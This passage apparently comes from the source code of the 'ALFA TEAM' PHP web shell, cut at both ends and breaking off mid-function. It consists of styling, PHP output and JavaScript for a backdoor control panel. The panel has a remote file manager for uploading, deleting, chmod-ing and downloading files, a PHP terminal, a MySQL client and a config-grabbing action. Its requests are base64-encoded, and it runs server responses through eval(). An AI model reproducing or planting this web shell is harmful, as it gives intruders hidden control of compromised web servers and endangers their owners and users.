ease-in-out;-o-transition:opacity .5s ease-in-out;transition:opacity .5s ease-in-out;-webkit-box-shadow:-1px 0 17px 0 #8b8b8c;-moz-box-shadow:-1px 0 17px 0 #8b8b8c;box-shadow:-1px 0 17px 0 #8b8b8c;padding:0;border:1px solid #737373;border-radius:10px}#rightclick_menu a{display:block;color:#fff;font-weight:bolder;text-decoration:none;padding:6px 8px 6px 30px;position:relative;padding-left:40px}#rightclick_menu a i.fa,#rightclick_menu a img{height:20px;font-size:17px;width:20px;position:absolute;left:5px;top:2px;padding-left:5px}#rightclick_menu a span{color:#bcb1b3;float:right}#rightclick_menu a:hover{color:#fff;background:#3879d9}#rightclick_menu hr{border:1px solid #ebebeb;border-bottom:0}.cl-popup-fixed{position:fixed;top:0;left:0;width:100%;height:100%;background:#201e1ead}#shortcutMenu-holder{position:absolute;top:40%;left:50%;transform:translate(-50%,-50%);background:#1f1e1edb;height:190px;width:500px;color:#fff}#shortcutMenu-holder>.popup-head{background:#207174;padding:6px;border-top:10px;text-align:center;font-family:sans-serif;color:#fff}#shortcutMenu-holder>form{padding:10px}#shortcutMenu-holder>form>label{display:block}#shortcutMenu-holder>form>input{width:99%;height:24px;margin-top:4px;color:#fff;outline:0;font-size:16px}#shortcutMenu-holder>.popup-foot{float:right;height:30px;margin-right:8px}#shortcutMenu-holder>.popup-foot>button{height:100%;cursor:pointer;color:#fff;outline:0}.php-terminal-output{overflow:auto;height:86%;border:1px solid #1e5673;border-radius:10px}.cmd-history-holder{visibility:hidden;opacity:0;position:absolute;color:#dff3d5;background:#093d58;top:-300px;height:300px;width:calc(69% + -11px);border-radius:10px 10px 0 0;left:calc(2% - 9px);transition:visibility .5s,opacity .5s linear}.cmd-history-holder .commands-history-header{background:#37504e;text-align:center;border-radius:10px 10px 0 0}.cmd-history-icon{width:27px;top:6px;left:calc(69% + 5px);position:absolute;cursor:pointer}.history-cmd-line{padding:4px;border-bottom:1px dashed;cursor:pointer}.history-cmd-line:hover{background:#961111}#myUL,#myUL ul{list-style-type:none}#myUL{margin:0;padding:0}.box{cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.box::before{content:"\2610";color:#000;display:inline-block;margin-right:6px}.check-box::before{content:"\2611";color:#1e90ff}.nested{display:none}.active{display:block}.flag-holder>img{width:20px;vertical-align:middle;padding-left:6px}#options_window .content_options_holder .options_holder{position:relative;display:none;overflow:auto;min-height:300px;max-height:calc(100vh - 100px)}#options_window .content_options_holder .options_holder .header{min-height:50vh}#options_window .content_options_holder .options_holder.option_is_active{display:block}#options_window .content_options_holder .options_tab{padding:5px;margin-left:14px;margin-right:30px;background:#000;border-bottom:7px solid #0f304a;border-left:7px solid #0f304a;border-right:7px solid #0f304a;overflow-x:auto;white-space:nowrap}#filesman_tabs .filesman_tab img,#options_window .content_options_holder .options_tab .tab_name img,.editor-tab-name img,.sql-tabs .sql-tabname img,.terminal-tabs .terminal-tab img{width:10px;vertical-align:middle;margin-left:5px}#filesman_tabs .filesman_tab,#options_window .content_options_holder .options_tab .tab_name,.editor-tab-name,.sql-tabs .sql-newtab,.sql-tabs .sql-tabname,.terminal-tabs .terminal-tab{display:inline-block;background-color:#133d51;border-radius:4px;padding:5px;color:#fff;margin-right:3px;padding:5px;cursor:pointer;margin-bottom:1px;transition:background-color .5s}#filesman_tabs .filesman_tab{min-width:55px;text-align:center}#filesman_tabs .filesman_tab:hover,#options_window .content_options_holder .options_tab .tab_name:hover,.editor-tab-name:hover,.sql-tabs .sql-tabname:hover,.terminal-tabs .terminal-tab:hover{background-color:#a23939}.editor-tabs,.sql-tabs,.terminal-tabs{padding:5px;overflow-x:auto;white-space:nowrap}.options-loader-holder{position:absolute;top:0;left:0;width:100%;height:100%;background:#2b2626c7;z-index:11}.options-loader-holder img{position:absolute;top:32%;left:45%;transform:translate(-50%,-50%);width:100px;animation:spin 2s infinite}#filesman_tabs .filesman_tab.filesman-tab-active,#options_window .content_options_holder .options_tab .tab_name.tab_is_active,.editor-tab-name.editor-tab-active,.sql-tabname.sql-active-tab,.terminal-tab.active-terminal-tab{background-color:#009688}.tab-is-done{animation:2s tab_change_color infinite step-end}.stopAjax{color:#fff;font-size:20px;display:inline-block;padding:10px;cursor:pointer}#a_loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#2b2626c7;z-index:99}.fmanager-row>td{position:relative}.fmanager-row .symlink_path{position:fixed;max-width:100%;background-color:#0f304a;border-radius:10px;font-size:15px;padding:8px;color:#fdf4f4;border:1px solid #8a8a8a;z-index:1;pointer-events:none}.archive-icons{vertical-align:middle}.archive-type-dir{font-weight:bolder}.archive-type-file{font-weight:unset}.archive-name{cursor:pointer}.archive_dir_holder a{color:#0f0;font-weight:bolder;cursor:pointer}.archive_dir_holder a:hover{color:#fff}.editor-content{height:100%}.editor-content-holder{height:90%}.editor-contents{display:none;position:relative;height:100%}.editor-contents.editor-content-active{display:block}.history-panel-controller{position:absolute;color:#fff;padding:10px;z-index:1000;border-radius:10px;top:50%;left:19%;background-color:#009687;cursor:pointer}.sql-content{display:none;position:relative;min-height:300px}.sql-content.sql-active-content{display:block}.pages-holder{padding:7px}.pages-number{display:inline-block;margin-left:10px}.pages-holder .pages-number a.page-number{padding:5px;background:#0f304a;margin-right:8px;cursor:pointer;width:33px;display:inline-block;text-align:center;border-radius:5px;color:#fff;transition:background .5s}.active-page-number{background:#10925c!important}.pages-number a.page-number:hover{background:#8a8a8a}.terminal-content{height:100%}.terminal-content,.terminal-tab{display:none}.terminal-content.active-terminal-content{display:block;position:relative}.terminal-btn-fontctl{background:#009688;width:50px;color:#fff;font-weight:bolder;outline:0;cursor:pointer}.alert-area{max-height:100%;position:fixed;bottom:5px;left:20px;right:20px;z-index:9999}.alert-box{font-size:16px;color:#fff;background:rgba(0,0,0,.9);line-height:1.3em;padding:10px 15px;margin:5px 10px;position:relative;border-radius:5px;transition:opacity .5s ease-in;-webkit-animation:alert-shake .5s ease-in-out;animation:alert-shake .5s ease-in-out}.alert-content-title{font-weight:700}.alert-box.alert-success{background:rgba(56,127,56,.89)}.alert-error{background:rgba(191,54,54,.89)}.alert-box.hide{opacity:0}.alert-close{background:0 0;width:12px;height:12px;position:absolute;top:15px;right:15px}.alert-close:after,.alert-close:before{content:"";width:15px;border-top:solid 2px #fff;position:absolute;top:5px;right:-1px;display:block}.alert-close:before{transform:rotate(45deg)}.alert-close:after{transform:rotate(135deg)}.alert-close:hover:after,.alert-close:hover:before{border-top:solid 2px #d8d8d8}@media (max-width:767px) and (min-width:481px){.alert-area{left:100px;right:100px}}@media (min-width:768px){.alert-area{width:350px;left:auto;right:0;z-index:9999}}@keyframes tab_change_color{0%{background-color:#133d51}50%{background-color:green}}@-webkit-keyframes alert-shake{0%{-webkit-transform:translateX(0)}20%{-webkit-transform:translateX(-10px)}40%{-webkit-transform:translateX(10px)}60%{-webkit-transform:translateX(-10px)}80%{-webkit-transform:translateX(10px)}100%{-webkit-transform:translateX(0)}}@keyframes alert-shake{0%{transform:translateX(0)}20%{transform:translateX(-10px)}40%{transform:translateX(10px)}60%{transform:translateX(-10px)}80%{transform:translateX(10px)}100%{transform:translateX(0)}}.textEffect{position:absolute;width:500px;top:-10px;animation:alert-shake .5s ease-in-out;animation-iteration-count:2}.alfateam-loader-text{position:absolute;color:#46bb45;top:23%;left:49%;transform:translate(-50%,-50%);font-size:40px;letter-spacing:7px}.alfa-ajax-error{position:absolute;color:#ff0a0a;top:50%;left:50%;transform:translate(-50%,-50%);font-size:30px}.connection-hist-table{margin-left:auto;margin-right:auto;text-align:justify;border-collapse:collapse}.connection-hist-table td,.connection-hist-table th{border:1px solid #ddd;text-align:left;padding:8px}.connection-his-btn{margin-bottom:10px;padding:5px;background:#206920;color:#fff;border:none;outline:0;cursor:pointer;font-weight:700;transition:background .3s}.connection-his-btn.connection-delete{margin:unset;padding:5px;background:red;width:33px;border-radius:3px;transition:background .3s}.connection-delete:hover{background:#f56969!important}.connection-his-btn:hover{background:#30b330}#up_bar_holder{position:fixed;z-index:100000;width:100%}#filesman_tabs{padding:8px;border:1px solid #0e304a;color:#67abdf;overflow-x:auto;white-space:nowrap}.sortable-ghost{opacity:.5;background:#c8ebfb}.folder-tab-icon{width:16px!important}#filesman-tab-full-path{display:none;position:absolute;pointer-events:none;background:#163746;padding:7px;color:#0f0;border-radius:10px;min-width:58px;z-index:10}#filesman-tab-full-path::after{content:"";position:absolute;top:100%;left:35px;margin-left:-5px;border-width:5px;border-style:solid;pointer-events:none;border-color:#163746 transparent transparent transparent}.mysql-main{height:84vh;position:relative}.mysql-hide-content{display:none}.mysql-query-result-tabs{margin-bottom:10px;padding:3px;border-bottom:4px solid #0f304a}.mysql-main .tables-panel-ctl{position:absolute;color:#fff;padding:10px;z-index:1;border-radius:10px;top:45%;left:calc(17% + 10px);background-color:#009687;cursor:pointer}.tables-panel-ctl-min{left:-21px!important}.mysql-query-result-tabs div{display:inline-block;padding:5px;margin-right:2px;background:#133d51;color:#fff;cursor:pointer;transition:background-color .5s}.mysql-query-result-tabs div:hover{background-color:#a23939}.mysql-query-result-tabs div.mysql-query-selected-tab{background:red}table tr.tbl_row:nth-child(odd){background:#424040}.mysql-tables .tables-row{margin-left:26px}.mysql-main .mysql-query-results,.mysql-main .mysql-tables{float:left;height:100%;overflow:auto}.mysql-main .mysql-query-results{width:calc(80% + 4px);margin-left:5px;position:relative;overflow:unset}.mysql-main .mysql-query-results-fixed{width:100%}.mysql-main .mysql-query-results .mysql-query-content{height:89%;overflow:auto}.mysql-query-tab-hide{height:0!important;padding:0!important}.mysql-main .mysql-tables{width:19%;border-right:4px solid #0e304a}.mysql-main table td{vertical-align:top}.mysql-main .mysql-search-area table td{vertical-align:middle;padding:7px}.mysql-tables .block{position:relative;width:1.5em;height:1.5em;min-width:16px;min-height:16px;float:left}.mysql-tables div.block b,.mysql-tables div.block i{width:1.5em;height:1.7em;min-width:16px;min-height:8px;position:absolute;bottom:.7em;left:.75em;z-index:0}.mysql-tables .block i{display:block;border-left:1px solid #666;border-bottom:1px solid #666;position:relative;z-index:0}.mysql-tables .block b{display:block;height:.75em;bottom:0;left:.75em;border-left:1px solid #666}.mysql-tables div.block a,.mysql-tables div.block u{position:absolute;left:50%;top:50%;z-index:10}.mysql-tables div.block img{position:relative;top:-.6em;left:0;margin-left:-7px}.mysql-tables .clearfloat{clear:both}.mysql-tables ul{list-style-type:none;margin-left:0;padding:0}.mysql-tables ul li{white-space:nowrap;clear:both;min-height:16px}.mysql-tables .db_name{margin-left:10px}.mysql-tables .list_container{border-left:1px solid #666;margin-left:.75em;padding-left:.75em}.hide-db-tables{display:none}.mysql-main:after{content:"";display:table;clear:both}table.mysql-data-tbl{border:none!important;border-collapse:collapse!important}table.mysql-data-tbl tr th{padding:5px}table.mysql-data-tbl td{border-left:3px solid #305a8d;border-right:3px solid #305a8d;padding:6px}table.mysql-data-tbl td:first-child{border-left:none}table.mysql-data-tbl td:last-child{border-right:none}.mysql-insert-result,.mysql-structure-qres,.mysql-update-result{display:none;text-align:center;padding:10px;border:1px dashed;margin:22px}#alfa-copyright{margin-top:15px}.ic_b_plus{background-image:url(http://solevisible.com/icons/menu/b_plus.png)}.ic_b_minus{background-image:url(http://solevisible.com/icons/menu/b_minus.png)}
<?php echo '
@keyframes spin {from {transform: rotate(0deg);}to{transform: rotate(360deg);}}
@-webkit-keyframes spin {from {-webkit-transform: rotate(0deg);}to {-webkit-transform: rotate(360deg);}}
@-moz-keyframes spin {from {-moz-transform: rotate(0deg);}to {-moz-transform: rotate(360deg);}}
@-ms-keyframes spin {from {-ms-transform: rotate(0deg);}to {-ms-transform: rotate(360deg);}}
#alfaloader{'.$znvaonll8c039c80621a8d6636f1b6d0998e4e3d.'width:100px;height:100px;}
#a_loader img{'.$znvaonll8c039c80621a8d6636f1b6d0998e4e3d.'width:150px;height:150px;position:fixed;z-index:999999;top: 31%;left: 45%;}
.ajaxarea{display:none;border:1px solid #0E304A;color:#67ABDF}.up_bar{margin-bottom: 2px;transition:width 2s;background-color:red;width:0;height:8px;display:none;}#hidden_sh{background-color:#0E304A;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole{background-color:#000;background-image:url(http://solevisible.com/images/alfabg.png);background-position:center;background-attachment:fixed;background-repeat:no-repeat}.header{height:auto;width:auto;border:7px solid #0E304A;color:'.alfa_getColor("header_values").';font-size:12px;font-family:Verdana,Geneva,sans-serif}.header a{text-decoration:none;}.filestools a{color:#0F0;text-decoration:none}.filestools a:hover{color:#FFF;text-decoration:none;}span{font-weight:bolder;color:#FFF}.txtfont{font-family:"Comic Sans MS";font-size:small;color:#fff;display:inline-block}.txtfont_header{font-family:"Comic Sans MS";font-size:large;display:inline-block;color:#59cc33}.tbltxt{font-family:"Comic Sans MS";color:#fff;font-size:small;display:inline-block}input[type="file"]{display:none}.inputfile{border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;border-radius:4px;height:20px;width:250px;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;display:inline-block;overflow:hidden}.inputfile:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}.inputfile span,.inputfile strong{padding:2px;padding-left:10px}.inputfile span{color:#25ff00;width:90px;min-height:2em;display:inline-block;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;vertical-align:top;float:left}.inputfile strong{background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:float;height:100%;width:109px;color:#fff;background-color:#0E304A;display:inline-block;float:right}.inputfile:focus strong,.inputfile.has-focus strong,.inputfile:hover strong{background-color:#46647A}.button{padding:3px}#addup,.button{outline:none;cursor:pointer;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px;background-color:#000;color:green;border-radius:100px}#addup:hover,.button:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:disabled:hover{cursor:not-allowed}td{padding:'.($GLOBALS['DB_NAME']['show_icons']=='1'?'0':'1').'px}.myCheckbox{padding-left:2px}.myCheckbox label{display:inline-block;cursor:pointer;position:relative}.myCheckbox input[type=checkbox]{display:none}.myCheckbox label:before{content:"";display:inline-block;width:14px;height:13px;position:absolute;background-color:#aaa;box-shadow:inset 0 2px 3px 0 rgba(0,0,0,.3),0 1px 0 0 rgba(255,255,255,.8)}.myCheckbox label{margin-bottom:15px;padding-right:17px}.myCheckbox label:before{border-radius:100px}input[type=checkbox]:checked + label:before{content:"";background-color:#0E304A;background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:50% 50%;background-size:14px 14px;box-shadow:0 0 4px #0F0}#meunlist{font-family:Verdana,Geneva,sans-serif;color:#FFF;width:auto;border-right-width:7px;border-left-width:7px;height:auto;font-size:12px;font-weight:700;border-top-width:0;border-color:#0E304A;border-style:solid}.whole #meunlist ul{text-align:center;list-style-type:none;margin:0;padding:5px 5px 7px 2px}.whole #meunlist li{margin:0;padding:0;display:inline}.whole #meunlist a{font-family:arial,sans-serif;font-size:14px;text-decoration:none;font-weight:700;clear:both;width:100px;margin-right:-6px;border-right-width:1px;border-right-style:solid;border-right-color:#FFF;padding:3px 15px}.foot{font-family:Verdana,Geneva,sans-serif;margin:0;padding:0;width:100%;text-align:center;font-size:12px;color:#0E304A;border-right-width:7px;border-left-width:7px;border-bottom-width:7px;border-bottom-style:solid;border-right-style:solid;border-right-style:solid;border-left-style:solid;border-color:#0E304A}#text{text-align:center}input[type=submit]{cursor:pointer;background-image:url('.__showicon('btn').');background-repeat:no-repeat;background-position:50% 50%;background-size:23px 23px;background-color:#000;width:30px;height:30px;border:1px solid #27979B;border-radius:100px}textarea{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}textarea:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text],input[type=number],.alfa_custom_cmd_btn{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}input[type=submit]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:2px solid #27979B;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}select{padding:3px;width:162px;color:#FFE;text-shadow:#000 0 2px 7px;border:1px solid #0E304A;background:#000;text-decoration:none;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}select:hover{border:1px solid #27979B;box-shadow:0 0 4px #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}
.foottable{width: 300px;font-weight: bold;'.(!@is_writable($GLOBALS['cwd'])?'}.dir{background-color:red;}':'}').'.main th{text-align:left;}.main a{color: #FFF;}.main tr:hover{background-color:#646464 !important;}.ml1{ border:1px solid #0E304A;padding:5px;margin:0;overflow: auto; }.bigarea{ width:99%; height:300px; }.alfa_custom_cmd_btn {padding: 5px;color: #24ff03;cursor: pointer;}.ajaxarea.filesman-active-content {display: block;}'.alfaCssLoadColors().'
</style>';
echo "<script type='text/javascript'>
var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
var a_ = '" . htmlspecialchars(@$_POST['a']) ."';
var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
var islinux = ".($GLOBALS['sys']!="win"?'true':'false').";
var post_encryption_mode = ".(__ALFA_POST_ENCRYPTION__?'true':'false').";";?>
var alfa1_="",alfa2_="",alfa3_="",alfa4_="",alfa5_="",alfa6_="",alfa7_="",alfa8_="",alfa9_="",alfa10_="",d=document,mysql_cache={},editor_files={},editor_error=!0,editor_current_file="",php_temrinal_using_cgi=!1,is_minimized=!1,cgi_is_minimized=!1,options_window_is_minimized=!1,database_window_is_minimized=!1,rightclick_menu_context=null,can_hashchange_work=!0,alfa_can_add_opt=!1,alfa_before_do_action_id="",alfa_ace_editors={editor:null,eval:null},col_dumper_selected_data={},_ALFA_AJAX_={},cgi_lang="",upcount=1,terminal_walk_index=[],alfa_current_fm_id=1,alfa_fm_id=0;function set(e,a,t,i,l,o,r,n,s,c,f,_,u){d.mf.a.value=null!=e?e:a_,d.mf.c.value=null!=a?a:c_,d.mf.alfa1.value=null!=t?t:"",d.mf.alfa2.value=null!=i?i:"",d.mf.alfa3.value=null!=l?l:"",d.mf.alfa4.value=null!=o?o:"",d.mf.alfa5.value=null!=r?r:"",d.mf.alfa6.value=null!=n?n:"",d.mf.alfa7.value=null!=s?s:"",d.mf.alfa8.value=null!=c?c:"",d.mf.alfa9.value=null!=f?f:"",d.mf.alfa10.value=null!=_?_:"",d.mf.charset.value=null!=u?u:charset_}function fc(e){var a=alfa_current_fm_id,t="a="+alfab64("FilesMan")+"&c="+alfab64(e.c.value)+"&alfa1="+alfab64(e.alfa1.value)+"&ajax="+alfab64("true")+"&",i="",l=0;if(d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked&&(l++,i+="f[]="+alfab64(decodeURIComponent(e.value))+"&")}),0==l&&"paste"!=e.alfa1.value)return!1;switch(alfaloader("filesman_holder_"+a,"block"),e.alfa1.value){case"delete":d.querySelectorAll("#filesman_holder_"+a+" .fmanager-row").forEach(function(e){var a=e.querySelector("input[type=checkbox]");a.checked&&".."!=a.value?e.remove():a.checked=!1}),d.querySelector("#filesman_holder_"+a+" .chkbx").checked=!1;break;case"copy":case"move":case"zip":case"unzip":d.querySelectorAll("#filesman_holder_"+a+" input[type=checkbox]:checked").forEach(function(e){e.checked=!1})}_Ajax(d.URL,t+i,function(e){alfaloader("filesman_holder_"+a,"none"),alfaFmngrContextRow()},!1,"filesman_holder_"+a)}function initDir(e){var a="",t="";islinux&&(a="<a class=\"header_pwd\" onclick=\"g('FilesMan','/');\" path='/' href='#action=fileman&path=/'>/</a>",t="/");var l=e.split("/"),o="",r=islinux?"/":"";for(i in"-1"!=l.indexOf("..")&&(l.splice(l.indexOf("..")-1,1),l.splice(l.indexOf(".."),1)),l)""!=l[i]&&(o+="<a onclick=\"g('FilesMan','"+r+l[i]+"/');\" path='"+r+l[i]+"/' href='#action=fileman&path="+r+l[i]+'/\' class="header_pwd">'+l[i]+"/</a>",r+=l[i]+"/");$("header_cwd").innerHTML=a+o+" ",alfaInitCwdContext(),l=(l=t+l.join("/")).replace("//","/"),d.footer_form.c.value=l,$("footer_cwd").value=l,c_=l}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(e,a,t,i,l){var o=!1;return window.XMLHttpRequest?o=new XMLHttpRequest:window.ActiveXObject&&(o=new ActiveXObject("Microsoft.XMLHTTP")),void 0!==l&&(_ALFA_AJAX_[l]=o),o?(o.onreadystatechange=function(){4==o.readyState&&200==o.status?"function"==typeof t&&(t(o.responseText,l),alfaClearAjax(l)):4==o.readyState&&200!=o.status&&(alfaAjaxError(o.status,l,o.statusText,o.responseText),alfaClearAjax(l))},o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),void o.send(a)):void alert("Error !")}function alfaClearAjax(e){_ALFA_AJAX_.hasOwnProperty(e)&&delete _ALFA_AJAX_[e]}function handleup(e,a){var t="__fnameup";if(0!=a&&(t="__fnameup"+a),e.files.length>1){for(var i="",l=0;l<e.files.length;l++)i+=e.files[0].name+", ";$(t).innerHTML=i}else e.files[0].name&&($(t).innerHTML=e.files[0].name)}function u(e){var a=!1,t=0,i=alfa_current_fm_id,l=new FormData,o="filesman_holder_"+i;l.append("a",alfab64(e.a.value)),l.append("c",alfab64(e.c.value)),l.append("alfa1",alfab64(e.alfa1.value)),l.append("charset",alfab64(e.charset.value)),l.append("ajax",alfab64(e.ajax.value)),e.querySelectorAll("input[type=file]").forEach(function(e){if(0==e.value.length)return!1;if(e.files.length>1)for(var a=0;a<e.files.length;a++)l.append("f[]",e.files[a]);else l.append("f[]",e.files[0]);t++}),$("footerup").value="",$("__fnameup").innerHTML="";for(var r=1;r<=upcount;r++){var n=$("pfooterup_"+r);n&&n.parentNode.removeChild(n),upcount--}if(0==upcount&&upcount++,0==t)return!1;var s="up_bar_"+getRandom();$("up_bar_holder").insertAdjacentHTML("beforeend","<div id='"+s+"' class='up_bar'></div>");e.c.value;if(window.XMLHttpRequest?a=new XMLHttpRequest:window.ActiveXObject&&(a=new ActiveXObject("Microsoft.XMLHTTP")),a){var c=$(s);_ALFA_AJAX_[s]=a,a.upload&&(c.style.display="block",a.upload.onprogress=function(e){var a=e.position||e.loaded,t=e.totalSize||e.total,i=Math.floor(a/t*1e3)/10+"%";c.style.width=i}),a.onload=function(e){200===a.status?c.style.display="none":alfaAjaxError(a.status,"upload_area",a.statusText,a.responseText),alfaClearAjax(s)},a.onreadystatechange=function(){if(4==a.readyState&&200==a.status){if("noperm"!=a.responseText&&"[]"!=a.responseText){var e,t=JSON.parse(a.responseText),l="",r=d.querySelectorAll("#"+o+" #filemanager_table tr").length-3;for(e in t){++r;var n=t[e].name,s=encodeURIComponent(n),c=t[e].size,f=t[e].perm,_=t[e].modify,u=t[e].owner,p=loadType(n,"file");try{d.querySelector("#"+o+" .fmanager-row a[fname='"+n+"']").parentElement.parentElement.parentElement.remove()}catch(e){}l+='<tr class="fmanager-row" id="tr_row_'+r+'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'+n+'" class="chkbx" id="checkbox'+r+'"><label for="checkbox'+r+'"></label></div></td><td id="td_row_'+r+'">'+p+'<div style="position:relative;display:inline-block;bottom:12px;"><a row="'+r+'" id="id_'+r+'" class="main_name" onclick="editor(\''+s+"','auto','','','','file');\" href=\"#action=fileman&amp;path="+c_+"&amp;file="+s+'" fname="'+n+'" ftype="file" path="'+c_+'" opt_title="">'+n+'</a></div></td><td><span style="font-weight:unset;" class="main_size">'+c+'</span></td><td><span style="font-weight:unset;" class="main_modify">'+_+'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'+u+'</span></td><td><a id="id_chmode_'+r+'" href="javascript:void(0)" onclick="editor(\''+s+"','chmod','','','','file')\">"+f+'</a></td><td><a id="id_rename_'+r+'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'rename','','','','file')\">R</a> <a id=\"id_touch_"+r+'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'touch','','','','file')\">T</a> <a id=\"id_edit_"+r+'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''+s+"', 'edit','','','','file')\">E</a> <a id=\"id_download_"+r+'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''+n+"', 'download')\">D</a><a id=\"id_delete_"+r+'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '+s+" # ?'); chk ? g('FilesMan',null,'delete', '"+s+"') : '';\"> X </a></td></tr>"}d.querySelector("#"+o+" #filemanager_last_tr").insertAdjacentHTML("beforebegin",l),alfaShowNotification("File(s) uploaded successfully","Uploader"),alfaFmngrContextRow()}else alfaShowNotification("Folder has no permission...","Uploader","error");alfaCheckCurrentFilesManTab(i)}},a.open("POST",d.URL),a.send(l)}}function alfaCheckCurrentFilesManTab(e){-1==$("filesman_tab_"+e).classList.value.indexOf("filesman-tab-active")&&$("filesman_tab_"+e).classList.add("tab-is-done")}function g(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset){var fm_id=0==alfa_fm_id?alfa_current_fm_id:alfa_fm_id,fm_id2=alfa_fm_id,fm_path=null==c||0==c.length?c_:c,d_mf_c=fm_path,g_action_id=alfa_before_do_action_id;0==alfa_fm_id&&(set(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset),d_mf_c=d.mf.c.value),"GetConfig"!=a&&"download"!=alfa2&&islinux&&"/"!=d_mf_c.substr(0,1)&&(d_mf_c="/"+d_mf_c),"FilesMan"==a?(alfaloader("filesman_holder_"+fm_id,"block"),g_action_id="filesman_holder_"+fm_id):""!=g_action_id?alfaloader(g_action_id,"block"):"FilesTools"!=a&&"download"!=alfa2&&"GetConfig"!=a&&("sql"==a?(showEditor("database_window"),g_action_id=loadPopUpDatabase("")):"FilesMan"!=a&&(showEditor("options_window"),g_action_id=loadPopUpOpTions(a)),alfaloader(g_action_id,"block"));for(var data="a="+alfab64(a)+"&c="+alfab64(d_mf_c)+"&",i=1;i<=10;i++)data+="alfa"+i+"="+alfab64(eval("d.mf.alfa"+i+".value"))+"&";if("FilesMan"==a){var pagenum=d.querySelector("#"+g_action_id+" .page-number.active-page-number");null!=pagenum&&(data+="pagenum="+alfab64(getCookie(g_action_id+"_page_number")),setCookie(g_action_id+"_page_number",1,2012))}if(data+="&ajax="+alfab64("true"),"FilesTools"==a&&"download"==alfa2){alfaLoaderOnTop("none");var dl=$("dlForm");return dl.a.value=alfab64("dlfile"),dl.c.value=alfab64(d_mf_c),dl.file.value=alfab64(alfa1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data,function(e,t){evalJS(e);var i=!1;if(alfaLoaderOnTop("none"),"sql"==a)return console.log(t),loadPopUpDatabase(e,t),!1;if("FilesMan"==a){alfaloader("filesman_holder_"+fm_id,"none"),d.querySelector("#filesman_holder_"+fm_id).innerHTML=e,fm_path=fm_path.replace(/\/\//g,"/"),$("filesman_tab_"+fm_id).setAttribute("path",fm_path);var l=alfaGetLastFolderName(fm_path);d.querySelector("#filesman_tab_"+fm_id+" span").innerHTML=l,alfaFmngrContextRow(),"function"==typeof 